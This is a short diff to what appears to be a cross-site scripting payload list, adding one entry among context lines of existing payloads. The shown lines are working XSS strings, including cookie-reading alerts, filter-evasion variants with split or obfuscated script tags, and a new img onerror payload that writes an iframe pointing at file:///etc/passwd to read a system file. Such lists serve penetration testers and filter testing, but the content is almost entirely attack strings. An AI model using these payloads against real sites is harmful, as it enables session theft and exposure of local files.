@@ -30,6 +30,7 @@ document.write('<iMg onerror=alert(1) src=a>')
 “%3e%3cscript%3ealert(document.cookie)%3c/script%3e
 “><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
 %00“><script>alert(document.cookie)</script>
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 <xml onreadystatechange=alert(1)>
 <script>eval(‘a\l\ert\(1\)’);</script>
 <script>’alert(1)’.replace(/.+/,eval)</script>
